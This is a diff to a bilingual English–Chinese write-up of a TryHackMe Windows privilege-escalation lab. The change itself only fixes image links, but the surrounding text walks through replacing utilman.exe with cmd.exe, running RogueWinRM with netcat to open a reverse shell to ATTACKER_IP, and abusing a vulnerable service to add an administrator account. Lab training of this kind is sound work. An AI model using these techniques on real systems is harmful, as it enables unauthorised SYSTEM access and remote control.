@@ -443,13 +443,13 @@ Here we can see that the associated executable is specified through the **BINARY
 Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can be seen from Process Hacker (available on your machine's desktop):  
 服务具有自由访问控制列表 （DACL），该列表指示谁有权启动、停止、暂停、查询状态、查询配置或重新配置服务以及其他权限。DACL 可以从 Process Hacker（在您机器的桌面上可用）中看到：
 
-![](/image/tryhackme/TryHackMe-Windows Privilege Escalation-1.png)  
+![](/image/tryhackme/TryHackMe-Windows%20Privilege%20Escalation-1.png)  
 
 
 All of the services configurations are stored on the registry under **HKLM\SYSTEM\CurrentControlSet\Services\**:  
 所有服务配置都存储在注册表中，如下 **HKLM\SYSTEM\CurrentControlSet\Services\** 所示：
 
-![](/image/tryhackme/TryHackMe-Windows Privilege Escalation-2.png)  
+![](/image/tryhackme/TryHackMe-Windows%20Privilege%20Escalation-2.png)  
 
 
 A subkey exists for every service in the system. Again, we can see the associated executable on the **ImagePath** value and the account used to start the service on the **ObjectName** value. If a <u>DACL</u> has been configured for the service, it will be stored in a subkey called **Security**. As you have guessed by now, only administrators can modify such registry entries by default.  
@@ -895,7 +895,7 @@ Log in to the target machine via <u>RDP</u> using the following credentials:
 This account is part of the "Backup Operators" group, which by default is granted the SeBackup and SeRestore privileges. We will need to open a command prompt using the "Open as administrator" option to use these privileges. We will be asked to input our password again to get an elevated console:  
 此帐户是“Backup Operators”组的一部分，默认情况下，该组被授予 SeBackup 和 SeRestore 权限。我们需要使用“以管理员身份打开”选项打开命令提示符才能使用这些权限。我们将被要求再次输入密码以获得提升的控制台：
 
-![](/image/tryhackme/TryHackMe-Windows Privilege Escalation-3.png)  
+![](/image/tryhackme/TryHackMe-Windows%20Privilege%20Escalation-3.png)  
 
 
 Once on the command prompt, we can check our privileges with the following command:  
@@ -1006,7 +1006,7 @@ Log in to the target machine via <u>RDP</u> using the following credentials:
 To get the SeTakeOwnership privilege, we need to open a command prompt using the "Open as administrator" option. We will be asked to input our password to get an elevated console:  
 要获得 SeTakeOwnership 权限，我们需要使用“以管理员身份打开”选项打开命令提示符。我们将被要求输入密码以获得提升的控制台：
 
-![](/image/tryhackme/TryHackMe-Windows Privilege Escalation-4.png)  
+![](/image/tryhackme/TryHackMe-Windows%20Privilege%20Escalation-4.png)  
 
 
 Once on the command prompt, we can check our privileges with the following command:  
@@ -1030,7 +1030,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
 We'll abuse **utilman.exe** to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:  
 这次我们将滥用 **utilman.exe** 特权来升级权限。Utilman 是一个内置的 Windows 应用程序，用于在锁定屏幕期间提供轻松访问选项：
 
-![](/image/tryhackme/TryHackMe-Windows Privilege Escalation-5.png)  
+![](/image/tryhackme/TryHackMe-Windows%20Privilege%20Escalation-5.png)  
 
 
 Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial.  
@@ -1071,13 +1071,13 @@ C:\Windows\System32\> copy cmd.exe utilman.exe
 To trigger utilman, we will lock our screen from the start button:  
 要触发 utilman，我们将从开始按钮锁定屏幕：
 
-![](/image/tryhackme/TryHackMe-Windows Privilege Escalation-6.png)  
+![](/image/tryhackme/TryHackMe-Windows%20Privilege%20Escalation-6.png)  
 
 
 And finally, proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:  
 最后，继续单击“易于访问”按钮，该按钮以系统权限utilman.exe运行。由于我们将其替换为cmd.exe副本，因此我们将获得具有 SYSTEM 权限的命令提示符：
 
-![](/image/tryhackme/TryHackMe-Windows Privilege Escalation-7.png)  
+![](/image/tryhackme/TryHackMe-Windows%20Privilege%20Escalation-7.png)  
 
 
   
@@ -1093,7 +1093,7 @@ Impersonation is easily understood when you think about how an <u>FTP</u> server
 Let's assume we have an <u>FTP</u> service running with user **ftp**. Without impersonation, if user Ann logs into the FTP server and tries to access her files, the FTP service would try to access them with its access token rather than Ann's:  
 假设我们有一个 FTP 服务与用户 **ftp** 一起运行。在没有模拟的情况下，如果用户 Ann 登录到 FTP 服务器并尝试访问她的文件，则 FTP 服务将尝试使用其访问令牌而不是 Ann 的文件访问它们：
 
-![](/image/tryhackme/TryHackMe-Windows Privilege Escalation-8.png)  
+![](/image/tryhackme/TryHackMe-Windows%20Privilege%20Escalation-8.png)  
 
 
 There are several reasons why using ftp's token is not the best idea: - For the files to be served correctly, they would need to be accessible to the **ftp** user. In the example above, the FTP service would be able to access Ann's files, but not Bill's files, as the DACL in Bill's files doesn't allow user **ftp**. This adds complexity as we must manually configure specific permissions for each served file/directory. - For the operating system, all files are accessed by user **ftp**, independent of which user is currently logged in to the <u>FTP</u> service. This makes it impossible to delegate the authorisation to the operating system; therefore, the <u>FTP</u> service must implement it. - If the <u>FTP</u> service were compromised at some point, the attacker would immediately gain access to all of the folders to which the **ftp** user has access.  
@@ -1102,7 +1102,7 @@ There are several reasons why using ftp's token is not the best idea: - For the 
 If, on the other hand, the FTP service's user has the SeImpersonate or SeAssignPrimaryToken privilege, all of this is simplified a bit, as the <u>FTP</u> service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf:  
 另一方面，如果 FTP 服务的用户具有 SeImpersonate 或 SeAssignPrimaryToken 权限，则所有这些都会简化一些，因为 FTP 服务可以临时获取登录用户的访问令牌，并使用它来代表他们执行任何任务：
 
-![](/image/tryhackme/TryHackMe-Windows Privilege Escalation-9.png)  
+![](/image/tryhackme/TryHackMe-Windows%20Privilege%20Escalation-9.png)  
 
 
 Now, if user Ann logs in to the FTP service and given that the ftp user has impersonation privileges, it can borrow Ann's access token and use it to access her files. This way, the files don't need to provide access to user **ftp** in any way, and the operating system handles authorisation. Since the FTP service is impersonating Ann, it won't be able to access Jude's or Bill's files during that session.  
@@ -1128,7 +1128,7 @@ Let's start by assuming we have already compromised a website running on IIS and
 We can use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest for this task:  
 我们可以使用 Web shell 来检查被入侵帐户的分配权限，并确认我们拥有此任务的两个相关权限：
 
-![](/image/tryhackme/TryHackMe-Windows Privilege Escalation-10.png)  
+![](/image/tryhackme/TryHackMe-Windows%20Privilege%20Escalation-10.png)  
 
 
 To use RogueWinRM, we first need to upload the exploit to the target machine. For your convenience, this has already been done, and you can find the exploit in the **C:\tools\** folder.  
@@ -1156,7 +1156,7 @@ And then, use our web shell to trigger the RogueWinRM exploit using the followin
 c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
 ```
 
-![](/image/tryhackme/TryHackMe-Windows Privilege Escalation-11.png)  
+![](/image/tryhackme/TryHackMe-Windows%20Privilege%20Escalation-11.png)  
 
 
 **Note:** The exploit may take up to 2 minutes to work, so your browser may appear as unresponsive for a bit. This happens if you run the exploit multiple times as it must wait for the BITS service to stop before starting it again. The BITS service will stop automatically after 2 minutes of starting.  
@@ -1197,7 +1197,7 @@ Abusing vulnerable software
 Make sure to click the **Start Machine** button before you continue, which will deploy the target machine in split-view. If you prefer connecting to the machine via <u>RDP</u>, you can use the following credentials:  
 在继续操作之前，请确保单击“启动计算机”按钮，这将在拆分视图中部署目标计算机。如果希望通过 RDP 连接到计算机，可以使用以下凭据：
 
-![](/image/tryhackme/TryHackMe-Windows Privilege Escalation-12.png)
+![](/image/tryhackme/TryHackMe-Windows%20Privilege%20Escalation-12.png)
 
 | **Username** | thm-unpriv |
 | :---: | :---: |
@@ -1247,7 +1247,7 @@ A patch was issued, where they decided to check that the executed command starte
 To put together a working exploit, we need to understand how to talk to port 6064. Luckily for us, the protocol in use is straightforward, and the packets to be sent are depicted in the following diagram:  
 为了整合一个有效的漏洞，我们需要了解如何与端口 6064 通信。幸运的是，使用的协议很简单，要发送的数据包如下图所示：
 
-![](/image/tryhackme/TryHackMe-Windows Privilege Escalation-13.png)
+![](/image/tryhackme/TryHackMe-Windows%20Privilege%20Escalation-13.png)
 
 The first packet is simply a hello packet that contains a fixed string. The second packet indicates that we want to execute procedure number 5, as this is the vulnerable procedure that will execute any command for us. The last two packets are used to send the length of the command and the command string to be executed, respectively.  
 第一个数据包只是一个包含固定字符串的 hello 数据包。第二个数据包表示我们要执行第 5 个过程，因为这是将为我们执行任何命令的易受攻击的过程。最后两个数据包分别用于发送要执行的命令长度和命令字符串。
@@ -1304,7 +1304,7 @@ Global Group memberships     *None
 As a last step, you can run a command prompt as administrator:  
 最后一步，您可以以管理员身份运行命令提示符：
 
-![](/image/tryhackme/TryHackMe-Windows Privilege Escalation-14.png)  
+![](/image/tryhackme/TryHackMe-Windows%20Privilege%20Escalation-14.png)  
 
 
 When prompted for credentials, use the **pwnd** account. From the new command prompt, you can retrieve your flag from the Administrator's desktop with the following command **type C:\Users\Administrator\Desktop\flag.txt**  
